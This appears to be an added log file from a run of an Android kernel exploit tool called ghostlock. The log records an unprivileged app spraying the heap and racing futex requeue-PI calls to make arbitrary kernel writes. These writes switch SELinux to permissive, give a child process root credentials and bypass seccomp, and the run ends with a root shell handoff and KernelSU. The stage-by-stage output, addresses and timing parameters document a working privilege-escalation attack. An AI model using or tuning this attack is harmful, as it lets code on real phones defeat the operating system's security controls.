@@ -1,0 +1,206 @@
+[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
+[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
+[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
+[33m[*] [0mcpu pair: main=0 consumer=1
+[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
+[33m[*] [0mruntime verbose_debug=1
+[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
+[33m[*] [0mdebug.execution.recommended_cpus.main=0
+[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
+[33m[*] [0mdebug.execution.selected_cpus.main=0
+[33m[*] [0mdebug.execution.selected_cpus.consumer=1
+[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
+[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
+[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
+[33m[*] [0mdebug.execution.race.route_wait_ms=1000
+[33m[*] [0mdebug.execution.race.setup_settle_us=50000
+[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
+[33m[*] [0mdebug.execution.stages.w1_attempts=15
+[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
+[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
+[33m[*] [0mdebug.execution.stages.w2_attempts=15
+[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
+[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
+[33m[*] [0mdebug.execution.stages.w3_attempts=6
+[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
+[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
+[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
+[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
+[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
+[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
+[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
+[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
+[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
+[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
+[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
+[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
+[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
+[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
+[33m[*] [0mdebug.execution.end
+[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
+[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
+[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
+[32m[+] [0mstartup context pid=13816 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=197456 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
+[32m[+] [0mstartup limits pid=13816 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
+[32m[+] [0mbuild config pid=13816 label=ghostlock_oplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=13816 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
+[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
+[33m[*] [0mmain thread running on cpu=0
+[33m[*] [0m[T+0ms] exploit start
+[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
+[33m[*] [0m[T+4ms] pre-W1 drain
+[33m[*] [0mW1: SELinux attempt 1/1
+[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
+[33m[*] [0m[T+181ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +243ms
+[33m[*] [0m[spray] finding futex collisions... +482ms
+[33m[*] [0m[spray] early collision screen 16/7 at 31%
+[33m[*] [0m[spray] futex collisions found +1968ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff892dfe2800 +1995ms
+[33m[*] [0m[spray] payload ready +2000ms
+[31m[-] [0mpage ffffff892dfe0000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 1/4 +2167ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +245ms
+[33m[*] [0m[spray] finding futex collisions... +514ms
+[33m[*] [0m[spray] early collision screen 16/7 at 31%
+[33m[*] [0m[spray] futex collisions found +2023ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8866ce4000 +2078ms
+[33m[*] [0m[spray] payload ready +2085ms
+[31m[-] [0mpage ffffff8866ce0000 stores an even byte over selinux_state.initialized; taking another
+[31m[-] [0mprepare_kernel_page retry 2/4 +4421ms
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +257ms
+[33m[*] [0m[spray] finding futex collisions... +510ms
+[33m[*] [0m[spray] early collision screen 16/7 at 31%
+[33m[*] [0m[spray] futex collisions found +2019ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8863a94000 +2082ms
+[33m[*] [0m[spray] payload ready +2087ms
+[33m[*] [0mprepare_kernel_page ok attempt=3 +6675ms
+[33m[*] [0m[T+6858ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
+[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
+[33m[*] [0mmcast ghost disarm ret=-1 errno=110
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+8867ms]   PI route done
+[32m[+] [0mSELinux permissive
+[33m[*] [0mW1b: private scratch repair attempt 1/3
+[33m[*] [0m=== W1b: private scratch repair === target=0xffffff8863a90108 mode=1 leaf=1
+[33m[*] [0m[T+8973ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +264ms
+[33m[*] [0m[spray] finding futex collisions... +538ms
+[33m[*] [0m[spray] early collision screen 16/7 at 31%
+[33m[*] [0m[spray] futex collisions found +2036ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8862419400 +2104ms
+[33m[*] [0m[spray] payload ready +2109ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +2280ms
+[33m[*] [0m[T+11258ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
+[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
+[33m[*] [0mmcast ghost disarm ret=-1 errno=110
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+13267ms]   PI route done
+[32m[+] [0mprivate scratch repaired; releasing quarantine
+[33m[*] [0m[T+13271ms] Write 1 complete
+[33m[*] [0m[T+13486ms] pre-W2 drain
+[33m[*] [0mperf task: 0xffffff8970d9b600 (144/256 votes)
+[33m[*] [0mperf task: 0xffffff8970d9b600 (175/256 votes)
+[33m[*] [0m[T+14407ms] perf_find_task done
+[33m[*] [0mchild_pid=24409 child_task=0xffffff8970d9b600
+[33m[*] [0mvr.ko not loaded; skipping tag clear
+[33m[*] [0mW2: cred attempt 1/15
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +231ms
+[33m[*] [0m[spray] finding futex collisions... +486ms
+[33m[*] [0m[spray] early collision screen 14/7 at 31%
+[33m[*] [0m[spray] futex collisions found +1972ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8a3333b800 +2082ms
+[33m[*] [0m[spray] payload ready +2086ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +2256ms
+[33m[*] [0mW2 fast repair payload prebuilt
+[33m[*] [0m=== W2: cred === target=0xffffff8970d9bd98 mode=2 leaf=0
+[33m[*] [0m[T+16869ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +241ms
+[33m[*] [0m[spray] finding futex collisions... +515ms
+[33m[*] [0m[spray] early collision screen 16/7 at 31%
+[33m[*] [0m[spray] futex collisions found +1988ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8868937400 +2050ms
+[33m[*] [0m[spray] payload ready +2053ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +2228ms
+[33m[*] [0m[T+19108ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
+[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
+[33m[*] [0mmcast ghost disarm ret=-1 errno=110
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+21116ms]   PI route done
+[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
+[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
+[33m[*] [0mmcast ghost disarm ret=-1 errno=110
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0mchild uid = 0
+[32m[+] [0mchild is root!
+[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
+[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff8970d9b600 mode=1 leaf=1
+[33m[*] [0m[T+22464ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +249ms
+[33m[*] [0m[spray] finding futex collisions... +513ms
+[33m[*] [0m[spray] early collision screen 16/7 at 31%
+[33m[*] [0m[spray] futex collisions found +1974ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8036e5a400 +2015ms
+[33m[*] [0m[spray] payload ready +2020ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +2196ms
+[33m[*] [0m[T+24665ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
+[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
+[33m[*] [0mmcast ghost disarm ret=-1 errno=110
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+26672ms]   PI route done
+[33m[*] [0m=== W3: seccomp mode === target=0xffffff8970d9be60 mode=1 leaf=1
+[33m[*] [0m[T+26727ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +247ms
+[33m[*] [0m[spray] finding futex collisions... +504ms
+[33m[*] [0m[spray] early collision screen 16/7 at 31%
+[33m[*] [0m[spray] futex collisions found +1977ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff8868205800 +2024ms
+[33m[*] [0m[spray] payload ready +2027ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +2195ms
+[33m[*] [0m[T+28928ms]   heap spray done
+[33m[*] [0m[route] creating waiter/owner/consumer
+[33m[*] [0mconsumer thread running on cpu=1
+[33m[*] [0m[route] waiter parked; owner started
+[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
+[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
+[33m[*] [0mmcast ghost disarm ret=-1 errno=110
+[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
+[33m[*] [0m[route] threads joined
+[33m[*] [0m[T+30936ms]   PI route done
+[33m[*] [0mseccomp finit_module probe = 0x16
+[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
+[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
+[33m[*] [0m[T+32997ms] exploit complete
+[33m[*] [0mhandoff: child=24409 alive=1 sent=1 errno=0
+[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
+[33m[*] [0mhandoff: root shell worker pid=5436
+[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
+[33m[*] [0menforce=1 (enforcing)
+[32m[+] [0mKernelSU ready
